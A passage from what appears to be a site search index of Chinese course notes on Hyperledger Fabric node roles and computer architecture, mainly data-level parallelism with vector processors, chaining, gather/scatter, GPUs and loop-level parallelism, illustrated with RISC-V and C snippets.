\u7f51\u7edc\u8282\u70b9\u6709\u56db\u7c7b\uff1a</p> <ul> <li>endorser: \u80cc\u4e66\u8282\u70b9<ul> <li>\u7279\u6b8a\u7684 peer \u8282\u70b9\uff0c\u5bf9\u4ea4\u6613\u63d0\u6848\u8fdb\u884c\u68c0\u67e5\uff0c\u6267\u884c\u667a\u80fd\u5408\u7ea6\uff0c\u8ba1\u7b97\u4ea4\u6613\u6267\u884c\u7ed3\u679c\u5e76\u5bf9\u5176\u8fdb\u884c\u80cc\u4e66</li> </ul> </li> <li>peer: \u8bb0\u8d26\u8282\u70b9<ul> <li>\u8d1f\u8d23\u7ef4\u62a4\u8d26\u672c\u7684 peer \u8282\u70b9\uff0c\u68c0\u67e5\u6392\u5e8f\u540e\u4ea4\u6613\u7ed3\u679c\u7684\u5408\u6cd5\u6027\uff0c\u5e76\u66f4\u65b0\u5230\u672c\u5730\u8d26\u672c</li> <li>\u76ee\u524d\u6240\u6709 peer \u8282\u70b9\u90fd\u9ed8\u8ba4\u4e3a\u8bb0\u8d26\u8282\u70b9</li> </ul> </li> <li>orderer: \u6392\u5e8f\u8282\u70b9<ul> <li>\u8d1f\u8d23\u63a5\u6536\u4ea4\u6613\uff0c\u5e76\u5bf9\u7f51\u7edc\u4e2d\u6240\u6709\u4ea4\u6613\u8fdb\u884c\u6392\u5e8f\uff0c\u6574\u7406\u4e3a\u533a\u5757\u7ed3\u6784</li> <li>\u8bb0\u8d26\u8282\u70b9\u4f1a\u4ece\u6392\u5e8f\u8282\u70b9\u62c9\u53bb\u65b0\u533a\u5757\u63d0\u4ea4\u5230\u672c\u5730\u8d26\u672c</li> </ul> </li> <li>CA: \u8bc1\u4e66\u8282\u70b9<ul> <li>\u63d0\u4f9b\u6807\u51c6\u7684 PKI \u670d\u52a1\uff0c\u8d1f\u8d23\u5bf9\u7f51\u7edc\u4e2d\u6240\u6709\u8bc1\u4e66\u8fdb\u884c\u7ba1\u7406\uff0c\u5305\u62ec\u7b7e\u53d1\u548c\u64a4\u9500</li> <li>\u4e0d\u53c2\u4e0e\u7f51\u7edc\u4e2d\u7684\u4ea4\u6613\u8fc7\u7a0b</li> </ul> </li> </ul> <p>\u4e0d\u540c\u7c7b\u578b\u7684\u8282\u70b9\u53ef\u4ee5\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u7269\u7406\u670d\u52a1\u5668\u4e0a</p> <p>\u57fa\u672c\u6982\u5ff5</p> <p></p> <p>Fabric \u7684\u8d26\u672c\u5b9e\u9645\u4e0a\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>&lt;1&gt; \u533a\u5757\u94fe Blockchain<ul> <li>\u4e00\u4e2a\u53ea\u53ef\u8ffd\u52a0\u7684\u3001\u4e0d\u53ef\u7be1\u6539\u7684\u4ea4\u6613\u65e5\u5fd7</li> <li>\u6309\u65f6\u95f4\u987a\u5e8f\u8bb0\u5f55\u6240\u6709\u6539\u53d8\u4e16\u754c\u72b6\u6001\u7684\u4ea4\u6613</li> </ul> </li> <li>&lt;2&gt; \u4e16\u754c\u72b6\u6001 World State<ul> <li>\u4e00\u4e2a\u5b58\u50a8\u7740\u5f53\u524d\u72b6\u6001\u7684\u6570\u636e\u5e93\uff0c\u5b83\u662f\u7531\u533a\u5757\u94fe\u4e2d\u6240\u6709\u4ea4\u6613\u6267\u884c\u540e\u5f97\u51fa\u7684\u6700\u7ec8\u7ed3\u679c</li> </ul> </li> </ul>"},{"location":"Courses/CA/","title":"Computer Architecture","text":""},{"location":"Courses/CA/#computer-architecture","title":"Computer Architecture","text":"<p> \u7ea6 84 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u7b80\u5355\u8bc4\u4ef7\u4e0b\u8fd9\u95e8\u8bfe</p> <p>\u6c34\u6c34\u7684\uff0c\u5e73\u65f6\u4e0d\u9700\u8981\u5b66\uff0c\u8003\u524d\u534a\u4e2a\u6708\u5f00\u59cb\u8bb0\u91cd\u70b9\u5c31\u591f\u4e86\u3002\u867d\u7136\u8bf4\u6cd5\u662f\u8003\u70b9\u4f1a\u8986\u76d6\u7684\u5f88\u6742\uff0c\u4f46\u5c31\u7b97\u8003\u5230\u4e86\u6ca1\u590d\u4e60\u5230\u7684\u70b9\u6ca1\u5199\u51fa\u6765\u4e5f\u591f\u62ff\u6ee1\u7ee9\u4e86\u3002</p>"},{"location":"Courses/CA/#reference","title":"Reference","text":"<ul> <li>\u8ba1\u7b97\u673a\u5b66\u9662\u670b\u8f88\u8f85\u5b66</li> </ul>"},{"location":"Courses/CA/#a4","title":"A4 \u7eb8\u53c2\u8003","text":""},{"location":"Courses/CA/DLP/","title":"Data-Level Parallelism","text":""},{"location":"Courses/CA/DLP/#data-level-parallelism","title":"Data-Level Parallelism","text":"<p> \u7ea6 1506 \u4e2a\u5b57  89 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>DLP \u6307\u7684\u662f\u6570\u636e\u6d41\u4e2d\u5b58\u5728\u5927\u91cf\u7684\u5e76\u884c\u6027</p> <p>SIMD \u6307\u4ee4\u67b6\u6784\u662f\u5b9e\u73b0\u6570\u636e\u7ea7\u5e76\u884c\u7684\u4e3b\u8981\u65b9\u6cd5\uff0c\u5e38\u7528\u5728\u9762\u5411\u77e9\u9635\u7684\u79d1\u5b66\u8ba1\u7b97\u3001\u9762\u5411\u5a92\u4f53\u7684\u56fe\u50cf/\u89c6\u9891\u5904\u7406\u7b49\u3002</p> <p>\u76f8\u6bd4\u4e8e TLP \u7684 MIMD\uff0cSIMD \u66f4\u9ad8\u6548\u8282\u80fd\uff0c\u56e0\u4e3a SIMD \u53ea\u9700\u8981\u4e00\u6761\u6307\u4ee4\u6d41\u63a7\u5236\u591a\u4e2a\u6570\u636e\u6d41\uff0c\u56e0\u6b64\u5728\u79fb\u52a8\u7aef\u5e94\u7528\u5e7f\u6cdb\u3002</p>"},{"location":"Courses/CA/DLP/#vecter-processor","title":"Vecter Processor","text":"<p>RV64V: RISC-V + \u5411\u91cf\u6307\u4ee4\u6269\u5c55</p> <p></p> <p>Vector \u5bf9\u6807\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684 Scalar(\u6807\u91cf)\uff0c\u5b83\u4f7f\u7528\u5355\u72ec\u4e00\u6761\u6307\u4ee4\u5bf9\u4e00\u4e32\u7c7b\u6570\u7ec4\u7684\u5411\u91cf\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\uff0c\u8282\u7701\u4e86 Instruction Fetch \u548c Decode \u7684\u65f6\u95f4\u3002</p> <p></p> <p>\u6ce8\u610f\u5411\u91cf\u52a0\u6cd5\u4e5f\u4e0d\u662f\u540c\u65f6\u5e76\u884c\u8ba1\u7b97\u7684\uff0c\u4e5f\u662f\u5355\u4e2a\u5355\u4e2a\u8ba1\u7b97\uff0c\u6240\u4ee5\u8bf4\u8282\u7701\u4e86 IF \u548c ID \u7684\u65f6\u95f4</p> <p>\u6211\u4eec\u4ee5\u4e00\u4e2a 32 elements \u7684\u5411\u91cf\u8ba1\u7b97 \\(a*\\overrightarrow{X} + \\overrightarrow{Y}\\) \u4e3a\u4f8b\uff1a</p> <pre><code># RISC-V CODE\n    fld  f0, a           # Load scalar a\n    addi x28, x5, 256    # Last address to load\nLoop:\n    fld  f1, 0(x5)       # f1 = X[i]\n    fmul.d f1, f1, f0    # f1 = a * X[i]\n    fld  f2, 0(x6)       # f2 = Y[i]\n    fadd.d f2, f2, f1    # f2 = a * X[i] + Y[i]\n    fsd  f2, 0(x6)       # store into Y[i]\n    addi x5, x5, 8       # inc index to X\n    addi x6, x6, 8       # inc index to Y\n    bne x28, x5, Loop\n\n# RV64V CODE\n    vsetdcfg  4 * FP64    # Enable 4 DP FP vregs\n    fld       f0, a       # Load scalar a\n    vld       v0, x5      # Load vector X\n    vmul      v1, v0, f0  # Vector-scalar mult\n    vld       v2, x6      # Load vector Y\n    vadd      v3, v1, v2  # Vector-vector add\n    vst       v3, x6      # Store the sum\n    vdisable              # Disable vector regs\n</code></pre> <p>\u4e00\u4e2a\u5411\u91cf\u4e2d\u7684\u8ba1\u7b97\u90fd\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u524d\u9762\u7684\u7ed3\u679c\uff0c\u8fd9\u4e2a\u6570\u636e\u4f9d\u8d56\u662f\u7531\u7f16\u8bd1\u5668\u6765\u4fdd\u8bc1\u7684\uff0c\u786c\u4ef6\u65e0\u9700\u68c0\u67e5\uff0c\u4ece\u800c\u786e\u4fdd\u8f83\u9ad8\u7684 Clock Rate\u3002</p> <p>\u5411\u91cf\u5904\u7406\u5668\u6709\u5927\u91cf\u7684\u5b58\u50a8\u8bbf\u95ee\u9700\u6c42\uff0c\u5176\u5b58\u50a8\u5668\u7ecf\u8fc7\u7279\u6b8a\u8bbe\u8ba1\u9ad8\u5ea6\u4ea4\u9519\uff0c\u5e76\u4e14\u4e0d\u4f7f\u7528 Data Cache\u3002\u5176\u5bf9\u5185\u5b58\u7684\u5e26\u5bbd\u5177\u6709\u8f83\u9ad8\u8981\u6c42\u3002</p> <p>\u5411\u91cf\u5904\u7406\u5668\u6709\u4e24\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>Memory-Memory Processor<ul> <li>\u76f4\u63a5\u64cd\u4f5c\u5185\u5b58\u4e2d\u7684\u6570\u636e</li> <li>e.g. CDC Star-100, TI ASC</li> <li>\u5185\u5b58\u5e26\u5bbd\u8981\u6c42\u8f83\u9ad8</li> <li>\u68c0\u67e5 Memory \u7684\u4f9d\u8d56\u8f83\u4e3a\u590d\u6742</li> </ul> </li> <li>Vector Register Processor<ul> <li>\u5148\u5c06\u6570\u636e\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668\u4e2d\u518d\u8fdb\u884c\u64cd\u4f5c</li> <li>e.g. Cray-1, \u4ee5\u53ca\u81ea 1980s \u540e\u7684\u6240\u6709 Vector Machines</li> <li>\u6211\u4eec\u6240\u8bf4\u7684 Vector Processor \u90fd\u9ed8\u8ba4\u4e3a Vector Register \u7c7b\u578b(\u5305\u62ec\u540e\u9762\u8ba8\u8bba\u7684)</li> </ul> </li> </ul> <p>\u4ee5\u4e0b\u7a0b\u5e8f\u7528\u4e8e\u7b80\u5355\u5bf9\u6bd4\u4e8c\u8005\u533a\u522b\uff1a</p> <pre><code># C code\nfor (i=0;i&lt;N;i++)\n{\n    C[i] = A[i] + B[i];\n    D[i] = A[i] - B[i];\n}\n\n# Memory-Memory\nADDV    C, A, B\nSUBV    D, A, B\n\n# Vector Register\nLV      V1, A\nLV      V2, B\nADDV    V3, V1, V2\nSV      V3, C\nSUBV    V4, V1, V2\nSV      V4, D\n</code></pre> <p>\u5728\u6ca1\u6709\u7ed3\u6784\u51b2\u7a81\u548c\u6570\u636e\u51b2\u7a81\u7684\u6761\u4ef6\u4e0b\uff0c\u4e00\u4e2a\u5411\u91cf\u8ba1\u7b97\u7684\u6267\u884c\u65f6\u95f4\u53d6\u51b3\u4e8e\u5411\u91cf\u957f\u5ea6\u3002RV64V \u6307\u4ee4\u96c6\u4e2d\u7684 FU \u4e00\u4e2a\u5468\u671f\u53ef\u4ee5\u5904\u7406\u4e00\u4e2a\u5411\u91cf\u5143\u7d20\uff0c\u56e0\u6b64\u5176\u6267\u884c\u65f6\u95f4\u53ef\u8ba4\u5b9a\u4e3a\u5411\u91cf\u7684\u957f\u5ea6\u3002</p> <p>\u6bcf\u4e2a\u673a\u5668\u6709\u81ea\u5df1\u7684\u6700\u5927\u5411\u91cf\u957f\u5ea6 MVL\uff0c\u5373\u4e00\u6761\u6307\u4ee4\u6700\u591a\u80fd\u5904\u7406 MVL \u4e2a\u5143\u7d20\u3002\u5982\u679c\u5411\u91cf\u957f\u5ea6 VL&gt;MVL\uff0c\u5219\u9700\u8981\u5bf9\u5176\u62c6\u5206\uff0c\u751f\u6210 VL/MVL \u4e2a\u957f\u5ea6\u4e3a MVL \u7684\u5411\u91cf\u5faa\u73af\u3002\u8fd9\u4e00\u64cd\u4f5c\u53eb\u505a Strip Mining\u3002</p> <p>\u6709 \\(VL=N\\), \\(MVL&lt;N\\)</p> <ul> <li>\u5148\u5904\u7406 \\(N\\mod MVL\\) \u4e2a\u5143\u7d20</li> <li>\u7136\u540e\u5206\u6279\u5904\u7406 \\(MVL\\) \u4e2a\u5143\u7d20\uff0c\u5171\u9700 \\(\\lfloor N / MVL \\rfloor\\) \u7ec4</li> </ul> Additional Reading: Dynamic Register Type <p>\u52a8\u6001\u5bc4\u5b58\u5668\u7c7b\u578b\u6307\u5bc4\u5b58\u5668\u672c\u8eab\u7684\u6709\u6548\u5411\u91cf\u957f\u5ea6 VL(Vector Length) \u5728\u6267\u884c\u65f6\u53ef\u4ee5\u52a8\u6001\u8bbe\u7f6e\uff0c\u800c\u4e0d\u662f\u5728\u7f16\u8bd1\u65f6\u5199\u6b7b\u3002VL \u5b58\u50a8\u5728 Vector-Length Register \u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u6307\u4ee4 <code>setvl</code> \u8bbe\u7f6e\u3002\u52a8\u6001\u5bc4\u5b58\u5668\u7c7b\u578b\u7279\u70b9\u4e3a\uff1a</p> <ul> <li>\u5bf9\u786c\u4ef6\u900f\u660e\uff0c\u5141\u8bb8\u5199\u51fa\u4e0e\u786c\u4ef6\u65e0\u5173\u7684\u5411\u91cf\u4ee3\u7801</li> <li>\u7075\u6d3b\u6027\u9ad8\uff0c\u9002\u5e94\u4e0d\u540c\u5411\u91cf\u5bbd\u5ea6\u7684\u786c\u4ef6\uff0c\u5e76\u4e14\u652f\u6301\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362</li> <li>\u5982\u679c\u6570\u636e\u957f\u5ea6\u5927\u4e8e MVL\uff0c\u5219\u81ea\u52a8\u5206\u6279\u6267\u884c\uff08strip mining\uff09</li> </ul> <p>\u53e6\u5916\uff0c\u5728\u5411\u91cf\u5bc4\u5b58\u5668\u603b\u7a7a\u95f4\u4e0d\u53d8\u7684\u524d\u63d0\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6027\u7684\u7981\u7528\u51e0\u4e2a\u5411\u91cf\u5bc4\u5b58\u5668\uff0c\u8fd9\u6837\u6bcf\u4e2a\u5411\u91cf\u5bc4\u5b58\u5668\u5206\u914d\u5230\u4f4d\u6570\u5f97\u4ee5\u589e\u52a0\uff0c\u4ece\u800c\u6269\u5927 MVL \u7684\u503c\u3002\u5411\u91cf\u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8\u7684\u6570\u636e\u7c7b\u578b\u4e5f\u53ef\u4ee5\u7531\u7528\u6237\u6307\u5b9a\u3002</p> <p>Vector Chaining</p> <p>\u76f8\u5f53\u4e8e\u5411\u91cf\u7248\u672c\u7684 bypassing/forwarding</p> <p></p> <p>\u5bf9\u4e8e\u6709\u524d\u540e\u4f9d\u8d56\u7684\u6307\u4ee4\uff0c\u5982\u679c\u6709\u94fe\u63a5\u6280\u672f\uff0c\u5219\u524d\u4e00\u4e2a\u6307\u4ee4\u7684\u4e00\u4e2a\u5206\u91cf\u5b8c\u6210\u5219\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u4e2a\u6307\u4ee4\uff0c\u5e76\u4e0d\u7528\u7b49\u5f85\u5168\u90e8\u5206\u91cf\u8ba1\u7b97\u5b8c\u6210\u3002</p> <ul> <li>Convey: \u4e00\u7ec4\u53ef\u4ee5\u4e00\u8d77\u6267\u884c\u7684\u6307\u4ee4<ul> <li>\u8981\u6c42\u4e0d\u5305\u542b\u7ed3\u6784\u51b2\u7a81\uff0c\u4f46\u662f\u56e0\u4e3a chain \u7684\u5b58\u5728\u5141\u8bb8 RAW \u51b2\u7a81</li> </ul> </li> <li>Chimes: \u901a\u8fc7\u94fe\u63a5\u6280\u672f\u4ea7\u751f\u7684\u6267\u884c\u5e8f\u5217\uff0c\u662f\u6d41\u6c34\u7ebf\u7684\u8c03\u5ea6\u65f6\u95f4\u5355\u4f4d<ul> <li>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a Convey \u5bf9\u5e94\u4e00\u4e2a Chime\uff0c\u4e00\u4e2a Chime \u9700\u8981 \\(VL\\) \u4e2a\u65f6\u949f\u5468\u671f</li> </ul> </li> <li>Chaining: \u94fe\u63a5\u6280\u672f</li> <li>FLOP: \u6d6e\u70b9\u8fd0\u7b97\uff0c\uff0c\u4f8b\u5982\u4e00\u4e2a\u5bf9 32 element vector \u8ba1\u7b97\u7684 <code>vmul</code> \uff0c\u5176 FLOP = 32</li> </ul> <p></p> <p>\u8fd9\u91cc\u6700\u540e\u7684 <code>vst</code> \u4e3a\u4ec0\u4e48\u4e0d\u80fd\u548c\u524d\u9762\u4e24\u6761\u6307\u4ee4\u94fe\u5728\u4e00\u8d77\u5462\uff1f</p> <p>\u6211\u4eec\u9700\u8981\u4fdd\u8bc1\u5b58\u50a8\u6570\u636e\u7684\u6b63\u786e\u6027\uff0c\u6240\u4ee5\u5b58\u50a8\u6307\u4ee4 <code>vst</code> \u5fc5\u987b\u7b49\u5230\u6574\u4e2a\u5411\u91cf\u5747\u6709\u6548\u65f6\u624d\u80fd\u5f00\u59cb\u5199\u56de\u5185\u5b58\u3002</p> <p>\u8fd9\u91cc\u7684 cycles per FLOP \u7684\u8ba1\u7b97\u6d41\u7a0b\u5b9e\u9645\u5982\u4e0b</p> <p>Total Cycles = 3 * 32; Total FLOP = 2 * 32; Cycles per FLOP = 3 / 2;</p> <p>Question</p> \u9898\u9762\u89e3\u7b54 <p></p> <p>\u5728\u4e0d\u4f7f\u7528 chain \u7684\u6761\u4ef6\u4e0b\uff0c\u6bcf\u6761\u6307\u4ee4\u5fc5\u987b\u7b49\u5f85\u4e0a\u4e00\u6761\u6307\u4ee4\u6240\u6709\u5143\u7d20\u90fd\u6267\u884c\u5b8c\u6bd5\u624d\u80fd\u542f\u52a8\uff0c\u56e0\u6b64\u603b\u65f6\u95f4\u4e3a\u5c06\u5404\u4e2a\u6307\u4ee4\u7684\u65f6\u95f4\u90fd\u76f8\u52a0\u3002\u4f8b\u5982 <code>vadd</code> \u6307\u4ee4\u9700\u8981 \\(1+7+64=72\\ cycles\\)\uff0c\u5176\u5b83\u7c7b\u4f3c\uff0c\u6700\u540e\u76f8\u52a0\u3002</p> <p>\u4f7f\u7528 chain\uff0c\u5219\u5212\u5206\u4e3a\u4e09\u7ec4(<code>vsd</code>\u53ea\u80fd\u5355\u72ec\u4e00\u7ec4)\uff0c\u603b\u6267\u884c\u65f6\u95f4\u51cf\u53bb\u4e24\u4e2a 64\uff08\u524d\u4e24\u7ec4\u53ef\u4ee5\u524d\u9012\uff09 </p> <p>Conditional Execution</p> <pre><code>for (int i = 0; i &lt; N; i++)\n    if (A[i] &gt; 0) B[i] = A[i] + 1;\n</code></pre> <p>\u6211\u4eec\u8003\u8651\u989d\u5916\u8bbe\u7f6e\u4e00\u4e2a Predicate Register(Masked Vector) <code>p0</code>\uff0c\u901a\u8fc7\u63a9\u7801\u6765\u63a7\u5236\u5411\u91cf\u7684\u6267\u884c\u3002\u4f8b\u5982\u63a9\u7801 1010\uff0c\u5219\u53ea\u6709\u7b2c 0 \u4e2a\u548c\u7b2c 2 \u4e2a\u5143\u7d20\u4f1a\u6267\u884c\u8fd0\u7b97\u3002</p> <p>\u8fd9\u6837\uff0c\u6211\u4eec\u5728\u6267\u884c\u65f6\u5148\u626b\u63cf\u4e00\u904d\u63a9\u7801\uff0c\u53ea\u6267\u884c\u9700\u8981\u7684\u5143\u7d20\u3002\u800c\u4f20\u8f93\u6570\u636e\u65f6\u4e5f\u53ea\u4f20\u8f93\u9700\u8981\u7684\u5143\u7d20\uff0c\u4ece\u800c\u8282\u7701\u5e26\u5bbd\u3002</p> <pre><code>vpne p0, v0, f0   # Set p0(i) = 1 if v0(i) != f0\n</code></pre> <p>Gather/Scatter on Sparse Matrix</p> <p>\u5bf9\u4e8e\u7a00\u758f\u77e9\u9635\uff0c\u6211\u4eec\u8bbf\u95ee\u6216\u5b58\u5165\u53ef\u4ee5\u4f7f\u7528 Gather/Scatter \u64cd\u4f5c\uff1a</p> <ul> <li>Gather \u8fd0\u7b97\u63a5\u53d7\u4e00\u4e2a\u7d22\u5f15\u5411\u91cf\uff0c\u5e76\u901a\u8fc7\u4e0e\u57fa\u5730\u5740\u76f8\u52a0\u6765\u7ec4\u6210\u4e00\u4e2a\u65b0\u5411\u91cf\uff0c\u7ed3\u679c\u4e3a\u50a8\u5b58\u5728\u4e00\u4e2a\u5411\u91cf\u5bc4\u5b58\u5668\u4e2d\u7684\u7a20\u5bc6\u5411\u91cf</li> <li>\u5728\u5b8c\u6210\u5bf9\u7a20\u5bc6\u5411\u91cf\u7684\u805a\u96c6\u64cd\u4f5c\u540e\uff0c\u4ee5 Scatter \u7684\u5f62\u5f0f\u8fdb\u884c\u5b58\u50a8</li> </ul> <pre><code>// c code\nfor (i=0; i &lt; N; ++i)\n    A[i] = B[i] + C[D[i]];\n</code></pre> <pre><code>LV      VD, RD        # load indices into vector D\nLVI     VC, (RC, VD)  # load indirect from RC base\nLV      VB, RB        # load vector B\nADDV.D  VA, VB, VC    # DO ADD\nSV      VA, RA        # store result\n</code></pre> <p>\u5728 RV64V \u4e2d\uff0c\u6211\u4eec\u901a\u8fc7 <code>vldx</code> \u548c <code>vstx</code> \u6765\u901a\u8fc7\u7d22\u5f15\u8fdb\u884c Load/Store \u64cd\u4f5c\u3002</p> <p>Multi-Lane Implementation</p> <p>\u5212\u5206\u4e3a\u591a\u4e2a Lane\uff0c\u540c\u4e00\u4e2a\u5411\u91cf\u7684\u4e0d\u540c\u5206\u91cf\u53ef\u4ee5\u5728\u4e0d\u540c\u7684 Lane \u4e0a\u5b58\u50a8\u548c\u8ba1\u7b97\uff0c\u901a\u9053\u7684\u589e\u52a0\u80fd\u591f\u63d0\u5347\u5411\u91cf\u5355\u5143\u7684\u541e\u5410\u91cf\u5cf0\u503c\uff1a</p> <p></p> <p></p>"},{"location":"Courses/CA/DLP/#gpu","title":"GPU","text":"<p>GPU(Graphics Processing Unit) \u6309\u7ebf\u7a0b\u6267\u884c\uff0c\u5c5e\u4e8e Single Instruction Multiple Threads\u3002</p> <p>Single Instruction Multiple Threads \u652f\u6301 MIMD\u3001SIMD\u3001ILP \u7b49</p> <p>\u4e00\u7ec4\u7ebf\u7a0b\u79f0\u4e3a Block\uff0cBlock \u53c8\u88ab\u6392\u5217\u6210 Grid\u3002</p> <p>GPU \u4e0e\u5411\u91cf\u673a\u4e0d\u540c\u7684\u662f\uff1a</p> <ul> <li>\u6ca1\u6709\u6807\u91cf\u5904\u7406\u5668</li> <li>\u901a\u8fc7\u591a\u7ebf\u7a0b\u6765\u51cf\u5c0f\u5185\u5b58\u5ef6\u8fdf</li> <li>\u6709\u975e\u5e38\u591a FU</li> </ul> <p>CUDA \u5168\u79f0\u4e3a Compute Unified Device Architecture\u3002</p>"},{"location":"Courses/CA/DLP/#loop-level-parallelism","title":"Loop-Level Parallelism","text":"<p>\u57fa\u4e8e\u5faa\u73af\u7684\u5e76\u884c\u4e3b\u8981\u770b\u5faa\u73af\u7684\u8fed\u4ee3\u4e4b\u95f4\u662f\u5426\u6709\u6570\u636e\u4f9d\u8d56\uff08loop-carried dependence\uff09 \uff0c\u5373\u540e\u7eed\u8fed\u4ee3\u7684\u6570\u636e\u8bbf\u95ee\u662f\u5426\u4f9d\u8d56\u4e8e\u5148\u524d\u8fed\u4ee3\u7684\u8f93\u51fa\uff0c\u4f8b\u5982\uff1a</p> <pre><code>// \u6ca1\u6709\u5faa\u73af\u95f4\u4f9d\u8d56\nfor (i = 999; i &gt;= 0; ++i)\n    x[i] = x[i] + s;\n\n// \u6709\u5faa\u73af\u95f4\u4f9d\u8d56\uff0cS1 \u9700\u8981\u7528\u5230\u4e0a\u4e00\u8f6e S2 \u7684\u8f93\u51fa\nfor (i = 0; i &lt; 100; ++i)\n{\n    A[i]   = A[i] + B[i]; // S1\n    B[i+1] = C[i] + D[i]; // S2\n}\n</code></pre> <p>\u5faa\u73af\u95f4\u4f9d\u8d56\u53ef\u4ee5\u901a\u8fc7\u6539\u5199\u89e3\u51b3\uff1a</p> <pre><code>A[0] = A[0] + B[0];\nfor (i = 0; i &lt; 99; ++i)\n{\n    B[i+1] = C[i]  + D[i];\n    A[i+1] = A[i+1]+ B[i+1];\n}\nB[100] = C[99] + D[99];\n</code></pre> <p>\u6539\u5199\u540e\u4e0d\u4ec5\u89e3\u51b3\u4e86\u5faa\u73af\u95f4\u4f9d\u8d56\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5411\u91cf\u94fe\u63a5</p> <p>\u53e6\u4e00\u4e2a\u4f8b\u5b50\u5c1d\u8bd5\u5bf9\u5982\u4e0b\u9012\u5f52\u4f9d\u8d56\u8fdb\u884c\u6539\u5199\uff1a</p> <pre><code>for (i = 9999; i &gt;= 0; --i)\n    sum += x[i] * y[i];\n</code></pre> <p>\u6ce8\u610f\u5230\u5bf9\u4e8e\u6807\u91cf <code>sum</code>\uff0c\u5b83\u4f9d\u8d56\u4e8e\u4e0a\u4e00\u6b21\u5faa\u73af\u7ed3\u675f\u65f6\u81ea\u5df1\u7684\u503c\uff0c\u56e0\u6b64\u6211\u4eec\u5e76\u4e0d\u80fd\u7b80\u5355\u5c06\u8fd9\u4e2a\u5faa\u73af\u5e76\u884c\u3002\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6807\u91cf\u6269\u5c55(scalar expansion)\u6280\u672f\u6765\u8fdb\u884c\u8f6c\u6362\uff0c\u4f7f\u5176\u53ef\u4ee5\u5b8c\u5168\u5e76\u884c\uff1a</p> <pre><code>for (i = 9999; i &gt;= 0; --i)\n    sum[i] = x[i] * y[i];\n\n// \u5f52\u7ea6\nfor (i = 9999; i &gt;= 0; --i)\n    final += sum[i];\n</code></pre> <p>\u5176\u4e2d\u4ee3\u7801\u7684\u4e0a\u534a\u90e8\u5206\u53ef\u4ee5\u5b8c\u5168\u5e76\u884c\u6267\u884c\uff0c\u800c\u4ee3\u7801\u7684\u4e0b\u534a\u90e8\u5206\u53ef\u4ee5\u4f7f\u7528\u4e13\u7528\u786c\u4ef6\u8fdb\u884c\u5bf9\u5f52\u7ea6\u64cd\u4f5c\u7684\u52a0\u901f\uff1a</p> <pre><code>for (i = 999; i&gt;= 0; --i)\n    final[0] += sum[i];\n\nfor (i = 999; i&gt;= 0; --i)\n    final[1] += sum[i + 1000];\n\n...\n\nfor (i = 999; i&gt;= 0; --i)\n    final[9] += sum[i + 9000];\n\nfor (i = 0; i &lt; 10; ++i)\n    finalsum += final[i];\n</code></pre>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/","title":"Fundamentals of Computer Design","text":""},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#1-fundamentals-of-computer-design","title":"1. Fundamentals of Computer Design","text":"<p> \u7ea6 2824 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 14 \u5206\u949f</p> <p>Quote</p> <p></p> <p>\u7b2c\u4e00\u7ae0\u7b2c\u4e8c\u7ae0\u548c\u8ba1\u7ec4\u91cd\u5408\u5ea6\u6709\u70b9\u9ad8\uff0c\u4e14\u4e66\u4e0a\u8bb2\u7684\u6bd4\u8f83\u6742\uff0c\u6700\u597d\u8fd8\u662f\u770b\u770b\u671f\u672b\u4f1a\u8003\u4ec0\u4e48</p>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#introduction","title":"Introduction","text":""},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#class-of-computer","title":"Class of Computer","text":"<p>\u8ba1\u7b97\u4f7f\u7528\u65b9\u5f0f\u7684\u53d8\u5316\u4fc3\u8fdb\u4e86 5 \u79cd\u8ba1\u7b97\u673a\u5e02\u573a\u7684\u5f62\u6210\uff0c\u5176\u4e2d\u6bcf\u4e00\u79cd\u90fd\u6709\u81ea\u5df1\u4e0d\u540c\u7684\u5e94\u7528\u3001\u9700\u6c42\u548c\u8ba1\u7b97\u6280\u672f\u3002\u4e0b\u8868\u603b\u7ed3\u4e86\u4e3b\u6d41\u8ba1\u7b97\u73af\u5883\u53ca\u5176\u91cd\u8981\u7279\u5f81\uff1a</p> Computer Critical Design Issue Addition Personal Mobile Device(PMD) \u6210\u672c\u3001\u80fd\u8017\u3001\u5a92\u4f53\u6027\u80fd\u3001\u54cd\u5e94\u901f\u5ea6 PMD\u4e0e\u5d4c\u5165\u5f0f\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u53ef\u4ee5\u8fd0\u884c\u5916\u90e8\u5f00\u53d1\u7b2c\u4e09\u65b9\u8f6f\u4ef6(externally developed software) Desktop \u6027\u4ef7\u6bd4\u3001\u80fd\u8017\u3001\u56fe\u5f62\u6027\u80fd \u6700\u5927\u7684\u8ba1\u7b97\u673a\u5e02\u573a\uff0c\u8d8b\u5411\u4e8e\u5bfb\u627e\u6700\u4f18\u6027\u4ef7\u6bd4 Server \u541e\u5410\u91cf\u3001\u53ef\u7528\u6027\u3001\u53ef\u6269\u5c55\u6027\u3001\u80fd\u8017 \u670d\u52a1\u5668\u7684\u4e09\u4e2a\u7279\u5f81\uff1a\u4e0d\u95f4\u65ad\u5de5\u4f5c\uff0cAvailablity \u81f3\u5173\u91cd\u8981\uff1b\u9700\u6c42\u65e5\u76ca\u589e\u591a\uff0cScalability 